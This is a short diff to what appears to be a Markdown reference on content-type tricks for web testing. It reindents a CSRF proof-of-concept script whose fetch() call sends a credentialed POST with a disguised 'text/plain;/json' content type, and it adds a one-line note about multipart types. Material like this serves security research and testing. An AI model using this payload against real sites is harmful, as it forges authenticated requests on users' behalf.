@@ -33,11 +33,14 @@ Content-Length: 13
 **CSRF PoC**
 ```html
 <script>
-	fetch('http://localhost/json',{
-		method:'POST',
-		headers:{'Content-Type':'text/plain;/json'},
-		body:'{"test":true}',
-		credentials: 'include'
-	});
+  fetch('http://localhost/json',{
+    method:'POST',
+    headers:{'Content-Type':'text/plain;/json'},
+    body:'{"test":true}',
+    credentials: 'include'
+  });
 </script>
 ```
+
+**Multipart Content-Type**  
+Same as [PHP](ct-tricks/PHP.md)
